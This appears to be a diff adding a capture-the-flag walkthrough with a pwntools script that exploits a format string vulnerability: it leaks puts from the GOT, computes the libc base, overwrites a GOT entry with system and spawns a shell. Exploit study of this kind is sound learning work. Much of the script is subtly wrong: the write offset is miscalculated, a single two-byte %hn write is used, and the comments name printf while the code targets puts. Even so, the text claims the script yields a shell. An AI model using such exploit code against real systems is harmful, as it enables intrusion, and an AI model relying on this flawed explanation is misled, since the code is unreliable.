@@ -1,0 +1,84 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf` function. The main loop reads input into a buffer and then passes it directly to `printf`, which allows us to control the format string. We can use this to overwrite the GOT (Global Offset Table) entries with the address of `system` or any other function we want to call, such as `puts` to leak a libc address and then `system` to get a shell.
+
+Here are the steps and the corresponding code to solve this challenge:
+
+### Steps:
+1. **Leak a libc address**:
+   - Use a format string to leak the address of a known function (e.g., `puts`) from the GOT.
+   - Calculate the base address of libc.
+
+2. **Overwrite a GOT entry**:
+   - Overwrite the GOT entry of a function (e.g., `printf` or `puts`) with the address of `system`.
+
+3. **Trigger the overwritten function**:
+   - Call the overwritten function with the argument `/bin/sh` to get a shell.
+
+### Code:
+
+```python
+from pwn import *
+
+# Set up pwntools
+context.binary = './fmt'
+elf = context.binary
+libc = ELF('libc.so.6')
+
+# Start the process
+p = process('./fmt')
+
+# Step 1: Leak the address of puts from the GOT
+puts_got = elf.got['puts']
+log.info(f'puts@GOT: {hex(puts_got)}')
+
+# Craft the payload to leak the address of puts
+payload = b'%7$s' + p32(puts_got)
+p.sendline(payload)
+
+# Receive the leaked address
+leaked_puts = u32(p.recv(4))
+log.info(f'Leaked puts: {hex(leaked_puts)}')
+
+# Calculate the base address of libc
+libc_base = leaked_puts - libc.symbols['puts']
+log.info(f'Libc base: {hex(libc_base)}')
+
+# Step 2: Overwrite the GOT entry of printf with the address of system
+system_addr = libc_base + libc.symbols['system']
+log.info(f'system: {hex(system_addr)}')
+
+# Calculate the offset to write the address of system
+offset = (system_addr & 0xFFFFFFFF) - (puts_got & 0xFFFFFFFF)
+if offset < 0:
+    offset += 0x100000000
+
+# Craft the payload to overwrite the GOT entry
+payload = f'%{offset}c%7$hn'.encode() + p32(puts_got)
+p.sendline(payload)
+
+# Step 3: Trigger the overwritten function
+p.sendline(b'/bin/sh\x00')
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+
+1. **Leak the address of `puts`**:
+   - We use the format string `'%7$s'` to read the value at the address stored in the 7th parameter (which is the address of `puts` in the GOT).
+   - We send the payload and receive the leaked address.
+
+2. **Calculate the base address of libc**:
+   - Subtract the known offset of `puts` in libc from the leaked address to get the base address of libc.
+
+3. **Overwrite the GOT entry**:
+   - We calculate the offset needed to write the address of `system` into the GOT entry of `puts`.
+   - We craft the payload `f'%{offset}c%7$hn'` to write the calculated offset into the GOT entry of `puts`.
+
+4. **Trigger the overwritten function**:
+   - We send the string `'/bin/sh\x00'` to trigger the overwritten `puts` function, which now points to `system`.
+
+5. **Interact with the shell**:
+   - Finally, we interact with the shell to get a shell prompt.
+
+This should give you a shell and solve the challenge. Make sure to adjust the offsets and addresses if necessary based on the actual binary and libc version you are working with.
